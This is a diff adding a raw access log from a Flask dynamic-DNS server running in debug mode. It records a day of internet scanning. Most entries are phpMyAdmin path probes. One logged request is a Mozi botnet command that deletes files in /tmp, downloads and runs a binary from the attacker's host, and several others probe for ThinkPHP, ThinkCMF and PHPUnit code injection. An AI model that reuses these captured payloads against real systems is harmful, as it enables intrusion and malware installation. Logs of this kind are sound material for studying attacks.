@@ -1,0 +1,492 @@
+Error while IP detection
+ * Serving Flask app "dyndns" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 160-225-294
+192.168.178.1 - - [26/Apr/2021 10:53:23] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+27.45.58.5 - - [26/Apr/2021 11:18:31] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+http://27.45.58.5:38551/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1[0m" 404 -
+197.231.180.83 - - [26/Apr/2021 11:34:33] "[33mGET / HTTP/1.1[0m" 404 -
+80.82.77.192 - - [26/Apr/2021 11:44:19] "[33mGET / HTTP/1.1[0m" 404 -
+185.238.218.88 - - [26/Apr/2021 12:26:11] "[33mGET / HTTP/1.1[0m" 404 -
+185.238.218.88 - - [26/Apr/2021 12:26:12] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+193.118.53.194 - - [26/Apr/2021 12:31:18] "[33mGET / HTTP/1.1[0m" 404 -
+186.33.76.135 - - [26/Apr/2021 12:53:37] "[33mGET / HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:56] "[33mGET /phpMyAdmin1/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:56] "[33mGET /sql/sqladmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:56] "[33mGET /PMA2020/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:56] "[33mGET /db/myadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:56] "[33mGET /2phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:56] "[33mGET /administrator/db/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:56] "[33mGET /admin/sqladmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /phpmyadmin2012/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /PMA2014/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /mysql/admin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /program/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /phpmyadmin2018/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /admin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /db/myadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /administrator/PMA/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /PMA2015/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /PMA2019/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /PMA2020/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /pma2020/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /admin/sqladmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /db/webadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:57] "[33mGET /myadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /db/dbweb/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /db/phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /admin/sqladmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /sql/sql/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /pma/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /mysql/admin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /database/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /mysql/sqlmanager/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /_phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /pma2011/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /pma2012/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /phpMyAdmin_/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /phpmyadmin1/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /db/webdb/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /pma2021/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /phpmyadmin2020/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /db/phpmyadmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /pma2018/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /mysql/pMA/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /sql/sqlweb/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /php-myadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /sql/phpmyadmin2/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:58] "[33mGET /shopdb/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /myadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /mysql/pma/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /mysql-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /sql/phpmyadmin2/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /admin/phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /program/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /sql/websql/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /dbadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /db/phpmyadmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /phpMyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /db/db-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /phpMyAdmin5/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /phpmyadmin_/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /phpmyadmin5/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /db/phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /sql/sql-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /admin/sqladmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /pma2017/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /PMA2017/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /administrator/admin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /mysql-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:16:59] "[33mGET /PMA2011/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /phpmyadmin2021/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /db/dbadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /phpMyAdmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /admin/pMA/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /administrator/web/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /mysql/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /pma2011/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /phpmyadmin2/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /phpmyadmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /admin/web/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /pma2019/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /admin/phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /db/websql/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /sql/phpmyadmin2/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /2phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /sql/webadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /phpmyadmin_/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /mysql-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:00] "[33mGET /phpmyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /db/phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /phpmy-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /pma2012/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /db/myadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /administrator/PMA/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /db/dbweb/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /administrator/admin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /sql/webadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /phpmyadmin2/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /mysqladmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /phpmyadmin2011/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /mysql/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /admin/pMA/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /sql/php-myadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /admin/web/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /db/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /pma2015/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /PMA2020/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /2phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /mysql/web/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /db/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /admin/phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+91.218.65.239 - - [26/Apr/2021 13:17:01] "[33mGET /administrator/pma/index.php?lang=en HTTP/1.1[0m" 404 -
+46.175.68.188 - - [26/Apr/2021 13:18:05] "[33mGET / HTTP/1.1[0m" 404 -
+45.155.205.27 - - [26/Apr/2021 13:49:23] "[33mPOST /api/jsonws/invoke HTTP/1.1[0m" 404 -
+45.155.205.27 - - [26/Apr/2021 13:49:24] "[33mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1[0m" 404 -
+45.155.205.27 - - [26/Apr/2021 13:49:24] "[33mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1[0m" 404 -
+45.155.205.27 - - [26/Apr/2021 13:49:24] "[33mGET /solr/admin/info/system?wt=json HTTP/1.1[0m" 404 -
+45.155.205.27 - - [26/Apr/2021 13:49:24] "[33mGET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1[0m" 404 -
+45.155.205.27 - - [26/Apr/2021 13:49:24] "[33mGET /console/ HTTP/1.1[0m" 404 -
+45.155.205.27 - - [26/Apr/2021 13:49:24] "[33mPOST /Autodiscover/Autodiscover.xml HTTP/1.1[0m" 404 -
+45.155.205.27 - - [26/Apr/2021 13:49:24] "[33mGET /_ignition/execute-solution HTTP/1.1[0m" 404 -
+45.155.205.27 - - [26/Apr/2021 13:49:24] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+45.155.205.27 - - [26/Apr/2021 13:49:25] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+45.155.205.27 - - [26/Apr/2021 13:49:25] "[33mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1[0m" 404 -
+106.14.214.61 - - [26/Apr/2021 14:24:30] "[33mGET /login HTTP/1.0[0m" 404 -
+205.185.122.102 - - [26/Apr/2021 14:35:22] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
+123.9.197.68 - - [26/Apr/2021 17:03:57] "[33mPOST /HNAP1/ HTTP/1.0[0m" 404 -
+138.118.241.42 - - [26/Apr/2021 17:06:19] "[33mGET / HTTP/1.1[0m" 404 -
+80.250.156.229 - - [26/Apr/2021 18:36:31] "[33mGET /phpmyadmin/ HTTP/1.1[0m" 404 -
+183.136.225.14 - - [26/Apr/2021 18:55:23] "[33mGET / HTTP/1.1[0m" 404 -
+183.136.225.14 - - [26/Apr/2021 18:55:24] "[33mGET / HTTP/1.1[0m" 404 -
+183.136.225.14 - - [26/Apr/2021 18:55:27] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+80.82.77.240 - - [26/Apr/2021 19:08:56] "[33mGET / HTTP/1.0[0m" 404 -
+89.248.170.22 - - [26/Apr/2021 19:10:05] "[33mGET / HTTP/1.1[0m" 404 -
+185.76.59.4 - - [26/Apr/2021 19:24:10] "[33mGET / HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:09] "[33mGET /PMA2020/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:10] "[33mGET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:10] "[33mGET /sql/webadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:11] "[33mGET /db/db-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:11] "[33mGET /PMA2016/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:12] "[33mGET /db/phpmyadmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:12] "[33mGET /mysql/admin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:13] "[33mGET /mysqladmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:13] "[33mGET /sql/webdb/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:14] "[33mGET /pma2011/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:14] "[33mGET /PMA2020/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:15] "[33mGET /phpmyadmin_/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:16] "[33mGET /mysql-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:16] "[33mGET /phpmy/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:17] "[33mGET /mysql/admin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:17] "[33mGET /phpmyadmin_/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:18] "[33mGET /phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:18] "[33mGET /phpmyadmin2015/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:19] "[33mGET /phpmyadmin5/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:19] "[33mGET /pma2021/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:20] "[33mGET /mysql/db/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:20] "[33mGET /phpmyadmin2019/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:21] "[33mGET /mysql/pMA/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:21] "[33mGET /phpMyAdmin-3/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:22] "[33mGET /db/websql/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:22] "[33mGET /PMA2016/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:23] "[33mGET /MyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:24] "[33mGET /db/webdb/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:24] "[33mGET /PMA2016/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:25] "[33mGET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:25] "[33mGET /php-myadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:26] "[33mGET /mysql/pMA/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:26] "[33mGET /administrator/PMA/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:27] "[33mGET /db/phpmyadmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:27] "[33mGET /mysql/admin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:28] "[33mGET /mysql/sqlmanager/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:28] "[33mGET /administrator/pma/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:29] "[33mGET /mysql/admin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:30] "[33mGET /pma2013/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:30] "[33mGET /pma2011/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:31] "[33mGET /_phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:31] "[33mGET /admin/db/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:32] "[33mGET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:32] "[33mGET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:33] "[33mGET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:33] "[33mGET /PMA/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:34] "[33mGET /phpmyadmin1/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:34] "[33mGET /dbadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:35] "[33mGET /dbadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:35] "[33mGET /_phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:36] "[33mGET /phpMyAdmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:37] "[33mGET /PMA2021/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:37] "[33mGET /pma2021/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:38] "[33mGET /administrator/db/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:38] "[33mGET /administrator/pma/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:39] "[33mGET /sql/sql/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:39] "[33mGET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:40] "[33mGET /mysql/sqlmanager/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:40] "[33mGET /mysql/db/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:41] "[33mGET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:41] "[33mGET /phpMyAdmin_/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:42] "[33mGET /mysql/web/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:42] "[33mGET /pma2011/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:43] "[33mGET /MyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:43] "[33mGET /phpmy/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:44] "[33mGET /db/phpmyadmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:45] "[33mGET /phpMyAdmin_/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:45] "[33mGET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:46] "[33mGET /pma2016/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:46] "[33mGET /administrator/PMA/index.php?lang=en HTTP/1.1[0m" 404 -
